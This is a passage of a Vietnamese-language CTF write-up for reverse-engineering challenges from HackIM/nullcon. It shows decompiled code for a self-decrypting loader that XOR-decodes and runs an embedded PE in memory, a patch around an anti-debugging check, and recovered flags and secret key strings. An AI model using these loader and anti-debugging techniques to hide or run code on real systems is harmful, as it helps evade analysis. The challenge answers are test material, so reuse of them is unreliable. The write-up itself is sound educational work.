+TrID/32 - File Identifier v2.10 - (C) 2003-11 By M.Pontello
+
+Collecting data from file: boo
+100.0% (.) Mac OS X Mach-O 64bit Intel executable (4000/1)</pre>
+<p>=&gt; Mac OS Binary kernel Mach 64 bit</p>
+<p>Check string 1 tí thì thấy UPX 3.91!. Ok thử decompress nào</p>
+<pre class="lang:default decode:true">C:\Users\chim\Desktop\nullcon\re\boo&gt;upx -d boo
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2013
+UPX 3.91w       Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Sep 30th 2013
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+upx: boo: NotPackedException: not packed by UPX
+
+Unpacked 0 files.</pre>
+<p>Failed!</p>
+<p>Check lại string lần nữa để ý thấy cái zlib.so, struct.so, python ME... nghi ngờ thể loại python-&gt;bin quá.</p>
+<p>Find header PYZ =&gt; founded :yolo:</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?ssl=1"><img data-attachment-id="262" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/boo_3/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?fit=608%2C72&amp;ssl=1" data-orig-size="608,72" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="boo_3" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?fit=300%2C36&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?fit=604%2C72&amp;ssl=1" class="alignnone size-full wp-image-262" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?resize=604%2C72&#038;ssl=1" alt="boo_3" width="604" height="72" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?w=608&amp;ssl=1 608w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/boo_3.png?resize=300%2C36&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>Ok easy roài, extract data python ra thôi - <a title="Link" href="http://reverseengineering.stackexchange.com/questions/160/how-do-you-reverse-engineer-an-exe-compiled-with-pyinstaller" target="_blank">Link</a></p>
+<pre class="lang:python decode:true ">import sys
+
+if len(sys.argv) == 13:
+	print "Great: flag{g3771ng_st4rt3d_2015}"
+else:
+	print "."</pre>
+<p>-------------------------------------------------------------------------------------------------------</p>
+<h2><span style="color: #3366ff;">RE 200 - upx.exe</span></h2>
+<p>string thử chả thấy cái UPX! signature nào @@. decompress lại cho chắc failed nốt.</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?ssl=1"><img data-attachment-id="263" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_1/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?fit=631%2C125&amp;ssl=1" data-orig-size="631,125" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_1" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?fit=300%2C59&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?fit=604%2C120&amp;ssl=1" class="alignnone size-full wp-image-263" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?resize=604%2C120&#038;ssl=1" alt="upx_1" width="604" height="120" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?w=631&amp;ssl=1 631w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_1.png?resize=300%2C59&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>Run</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?ssl=1"><img data-attachment-id="264" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_2/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?fit=176%2C153&amp;ssl=1" data-orig-size="176,153" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_2" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?fit=176%2C153&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?fit=176%2C153&amp;ssl=1" class="alignnone size-full wp-image-264" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_2.png?resize=176%2C153&#038;ssl=1" alt="upx_2" width="176" height="153" data-recalc-dims="1" /></a></p>
+<p><em>OK boy let's make it nicely!</em></p>
+<p>Bật IDA Disass thấy đây là 1 binary MS C++ bình thường.</p>
+<p>main là winMain -&gt; sau đó call hàm sub_4001000</p>
+<pre class="height-set:true lang:c decode:true">int __stdcall wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd)
+{
+    sub_401000();
+    return 0;
+}
+
+void *__cdecl sub_401000()
+{
+    void *result; // eax@1
+    void *MZ_header; // ecx@1
+    int v2; // ecx@4
+    int v3; // ebp@4
+    int v4; // esi@4
+    int v5; // ebx@4
+    const char *v6; // edi@5
+    unsigned int v7; // edi@9
+    int v8; // ebx@9
+    HANDLE v9; // eax@9
+    void *v10; // esi@9
+    unsigned int v11; // eax@10
+    HANDLE v12; // eax@12
+    int v13; // ebx@12
+    SIZE_T v14; // [sp+0h] [bp-28h]@1
+    int v15; // [sp+4h] [bp-24h]@14
+    int v16; // [sp+8h] [bp-20h]@14
+    int v17; // [sp+Ch] [bp-1Ch]@14
+    int v18; // [sp+10h] [bp-18h]@14
+    int v19; // [sp+14h] [bp-14h]@14
+    SIZE_T v20; // [sp+18h] [bp-10h]@14
+    int v21; // [sp+1Ch] [bp-Ch]@14
+    int v22; // [sp+20h] [bp-8h]@14
+    int v23; // [sp+24h] [bp-4h]@14
+
+    result = GetModuleHandleW(0);
+    MZ_header = result;
+    v14 = (SIZE_T)result;
+    if ( result )
+    {
+        result = (void *)'ZM';
+        if ( *(_WORD *)MZ_header == 'ZM' )
+        {
+            result = (char *)MZ_header + *((_DWORD *)MZ_header + 15);
+            if ( *(_DWORD *)result == 'EP' )
+            {
+                v2 = *((_WORD *)result + 10);
+                v3 = *((_WORD *)result + 3);
+                v4 = 0;
+                v5 = (int)((char *)result + v2 + 24);
+                if ( v3 &gt; 0 )
+                {
+                    v6 = (char *)result + v2 + 24;
+                    while ( 1 )
+                    {
+                        result = (void *)strcmp(v6, ".reloc");
+                        if ( !result )
+                            break;
+                        ++v4;
+                        v6 += 40;
+                        if ( v4 &gt;= v3 )
+                            return result;
+                    }
+                    v7 = *(_DWORD *)(v5 + 40 * v4 + 16);
+                    v8 = v5 + 40 * v4;
+                    v9 = GetProcessHeap();
+                    result = HeapAlloc(v9, 8u, v7 + 1);
+                    v10 = result;
+                    if ( result )
+                    {                                           // malloc, copy hex sang cho malloc 6600
+                        unknown_libname_41(result, v14 + *(_DWORD *)(v8 + 12), *(_DWORD *)(v8 + 16));
+                        v11 = 0;
+                        if ( v7 )
+                        {
+                            do
+                                *((_BYTE *)v10 + v11++) ^= 0x11u;
+                            while ( v11 &lt; v7 );
+                        }
+                        v14 = *(_DWORD *)v10;
+                        v12 = GetProcessHeap();
+                        result = HeapAlloc(v12, 8u, v14);
+                        v13 = (int)result;
+                        if ( result )
+                        {
+                            result = (void *)sub_406660((int)((char *)v10 + 4), (int)result, v7 - 4, (int)&amp;v14);
+                            if ( !result )
+                            {
+                                v18 = 0;
+                                v15 = 0;
+                                v16 = 0;
+                                v17 = 0;
+                                v21 = 0;
+                                v22 = 0;
+                                v23 = 0;
+                                v20 = v14;
+                                v19 = v13;
+                                LOBYTE(v18) = 1;
+                                sub_401B60((int)&amp;v15);
+                                ExitProcess(1u);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    return result;
+}</pre>
+<p>đầu tiên nó gọi hàm getModuleHandle để tìm base address của MZ Header<br />
+sau đó check MZ signature và PE signature ::for sure::</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?ssl=1"><img data-attachment-id="265" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_3/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?fit=307%2C254&amp;ssl=1" data-orig-size="307,254" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_3" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?fit=300%2C248&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?fit=307%2C254&amp;ssl=1" class="alignnone size-full wp-image-265" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?resize=307%2C254&#038;ssl=1" alt="upx_3" width="307" height="254" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?w=307&amp;ssl=1 307w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_3.png?resize=300%2C248&amp;ssl=1 300w" sizes="(max-width: 307px) 100vw, 307px" data-recalc-dims="1" /></a></p>
+<p>find session .alloc</p>
+<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?ssl=1"><img data-attachment-id="266" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_4/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?fit=347%2C199&amp;ssl=1" data-orig-size="347,199" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_4" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?fit=300%2C172&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?fit=347%2C199&amp;ssl=1" class="alignnone size-full wp-image-266" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?resize=347%2C199&#038;ssl=1" alt="upx_4" width="347" height="199" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?w=347&amp;ssl=1 347w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_4.png?resize=300%2C172&amp;ssl=1 300w" sizes="(max-width: 347px) 100vw, 347px" data-recalc-dims="1" /></a><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?ssl=1"><img data-attachment-id="268" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_6/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?fit=609%2C35&amp;ssl=1" data-orig-size="609,35" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_6" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?fit=300%2C17&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?fit=604%2C35&amp;ssl=1" class="alignnone size-full wp-image-268" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?resize=604%2C35&#038;ssl=1" alt="upx_6" width="604" height="35" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?w=609&amp;ssl=1 609w, https://i0.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_6.png?resize=300%2C17&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<pre class="lang:default decode:true">var A = heapalloc(0x6600)</pre>
+<p>đến đoạn unknown_libname_41 này vì mình rất ghét cái gì cứ dấu giếm, và 1 phần nhác trỗi dậy. function thông thường của mscrt thôi nên xem các tham số truyền vô và kết quả trả về để đoán vậy (memcpy)</p>
+<pre class="lang:default decode:true">memcpy(0x41b00, A, 0x6600)
+for i in range(0x6600):
+	A[i] ^= 0x11</pre>
+<p>*một đoạn memory khá dài, lại còn bị mã hóa nữa. không thể nào là flag cipher được? Có lẽ nào là shellcode?</p>
+<pre class="lang:default decode:true">new_size = *(dword*)A = 0xbe00
+var B = heapalloc(new_size)
+sub_406660( &amp;new_size ) =&gt; copy MZ_Header -&gt; đến B, size = 0xbe00</pre>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?ssl=1"><img data-attachment-id="267" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_5/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?fit=468%2C132&amp;ssl=1" data-orig-size="468,132" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_5" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?fit=300%2C85&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?fit=468%2C132&amp;ssl=1" class="alignnone size-full wp-image-267" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?resize=468%2C132&#038;ssl=1" alt="upx_5" width="468" height="132" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?w=468&amp;ssl=1 468w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_5.png?resize=300%2C85&amp;ssl=1 300w" sizes="(max-width: 468px) 100vw, 468px" data-recalc-dims="1" /></a></p>
+<p>Từ đây ta nhảy vào sub func cuối là sub_401b60</p>
+<p>Check các sub phụ, để ý các string mình thấy rất là liên quan</p>
+<pre class="lang:default decode:true">[+] Mapping PE file
+[+] Creating Map View of File
+[+] Map View of File created
+[+] Checking for self relocation
+[+] MyBase, MySize ?!?
+[+] Jumping to relocated image
+[+] Processing IAT
+[+] Loading Library and processing
+[+] Fixing Image Base address in PEB
+[+] Executing Entry Point !!!</pre>
+<p>và 1 số function khá vãi</p>
+<pre class="lang:default decode:true ">- CreateFileMappingW
+- MapViewOfFile
+- VirtualAlloc
+- GetProcAddress
+- VirtualQuery
+- LoadLibraryA
+- VirtualProtect</pre>
+<p>oke, tít đi ít! run shellcode chắc roài ::bem::</p>
+<p>ta đặt breakpoint ở ngay các sub con và run lần lượt đến khi nào shell được chạy thì phát hiện điểm G</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?ssl=1"><img data-attachment-id="269" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_7/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?fit=413%2C56&amp;ssl=1" data-orig-size="413,56" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_7" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?fit=300%2C41&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?fit=413%2C56&amp;ssl=1" class="alignnone size-full wp-image-269" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?resize=413%2C56&#038;ssl=1" alt="upx_7" width="413" height="56" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?w=413&amp;ssl=1 413w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_7.png?resize=300%2C41&amp;ssl=1 300w" sizes="(max-width: 413px) 100vw, 413px" data-recalc-dims="1" /></a></p>
+<pre class="lang:default decode:true">sub_401b60 -&gt; sub_401600 -&gt; call eax
+new entry point =  08001563</pre>
+<p>sài HxD (hex editor) view ram process upx.exe tại địa chỉ đó thì thấy nguyên session từ 0x08000000 -&gt; 0x0800FFFF là 1 file PE mới,</p>
+<p>search string thì thấy có dòng "You didn't ask nicely" và đặc biệt là "-pl34se-give-me-th3-k3y" :-ss</p>
+<p>tới đây các bạn có thể extract ra 1 file exe mới và disass nghiên cứu (ko chắc là sẽ chạy đc ok), còn mình thì thấy nó có dạng 1 file ms c++ nữa nên so sánh structure với cái PE gốc để tìm addr winMain</p>
+<pre class="lang:default decode:true ">địa chỉ 0x08001100</pre>
+<p>quá trình dịch cũng tương tự, bài mới này cũng không quá khó.</p>
+<pre class="lang:default decode:true ">st = command_line_string
+st[len(st)-1] = \x00
+
+if st[len(st)]==\x20:
+	if !strcmp(st, "-pl34se-give-me-th3-k3y"):
+		func_flag()
+		exit()
+msgbox("You not nicely");</pre>
+<p>patch luôn cho lẹ, patch luôn chỗ strcmp và trong func_flag (0x08001000) có 1 chỗ gọi isDebuggerPresent (0x08001024)</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?ssl=1"><img data-attachment-id="270" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_8/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?fit=421%2C108&amp;ssl=1" data-orig-size="421,108" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_8" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?fit=300%2C77&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?fit=421%2C108&amp;ssl=1" class="alignnone size-full wp-image-270" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?resize=421%2C108&#038;ssl=1" alt="upx_8" width="421" height="108" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?w=421&amp;ssl=1 421w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_8.png?resize=300%2C77&amp;ssl=1 300w" sizes="(max-width: 421px) 100vw, 421px" data-recalc-dims="1" /></a></p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?ssl=1"><img data-attachment-id="271" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/upx_9/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?fit=581%2C138&amp;ssl=1" data-orig-size="581,138" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="upx_9" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?fit=300%2C71&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?fit=581%2C138&amp;ssl=1" class="alignnone size-full wp-image-271" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?resize=581%2C138&#038;ssl=1" alt="upx_9" width="581" height="138" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?w=581&amp;ssl=1 581w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/upx_9.png?resize=300%2C71&amp;ssl=1 300w" sizes="(max-width: 581px) 100vw, 581px" data-recalc-dims="1" /></a></p>
+<p>Done.</p>
+<p>----------------------------------------------------------------------------------</p>
+<h2><span style="color: #3366ff;">RE 400 - fin64</span></h2>
+<pre class="lang:default decode:true ">ubt64@ubt64-vb:/media/sf_Desktop/nullcon/re/fin64$ file fin64
+fin64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=0x9b62a9678a30ce6c576131024148154a0bc5575d, stripped</pre>
+<p>khi chạy và thử nhiều cách input, đều có kết quả "Not yet.."</p>
+<pre class="lang:default decode:true ">ubt64@ubt64-vb:/media/sf_Desktop/nullcon/re/fin64$ ./fin64
+Not yet..</pre>
+<p>main khá ngắn, ta dịch lần lượt<br />
+để ý, có 2 cái good_boy và bad_boy trong hình</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?ssl=1"><img data-attachment-id="274" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_1/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?fit=657%2C306&amp;ssl=1" data-orig-size="657,306" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_1" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?fit=300%2C140&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?fit=604%2C281&amp;ssl=1" class="alignnone size-full wp-image-274" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?resize=604%2C281&#038;ssl=1" alt="fin64_1" width="604" height="281" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?w=657&amp;ssl=1 657w, https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_1.png?resize=300%2C140&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
+<p>đầu tiên là func_systime<br />
+gọi syscall 0xc9 để lấy timestamp sao đó lưu giá trị vào [rbp-18h]</p>
+<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?ssl=1"><img data-attachment-id="275" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_2/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?fit=515%2C294&amp;ssl=1" data-orig-size="515,294" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_2" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?fit=300%2C171&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?fit=515%2C294&amp;ssl=1" class="alignnone size-full wp-image-275" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?resize=515%2C294&#038;ssl=1" alt="fin64_2" width="515" height="294" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?w=515&amp;ssl=1 515w, https://i2.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_2.png?resize=300%2C171&amp;ssl=1 300w" sizes="(max-width: 515px) 100vw, 515px" data-recalc-dims="1" /></a></p>
+<p>func_ctime - convert timestamp thành giá trị giây:phút:giờ:ngày:tháng:năm =&gt; lưu vào [rbp-10h]</p>
+<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?ssl=1"><img data-attachment-id="276" data-permalink="https://babyphd.net/2015/01/13/hackim-2014-re-pwn-mentalnote/fin64_3/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?fit=477%2C131&amp;ssl=1" data-orig-size="477,131" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fin64_3" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?fit=300%2C82&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?fit=477%2C131&amp;ssl=1" class="alignnone size-full wp-image-276" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2015/01/fin64_3.png?resize=477%2C131&#038;ssl=1" alt="fin64_3" width="477" height="131" 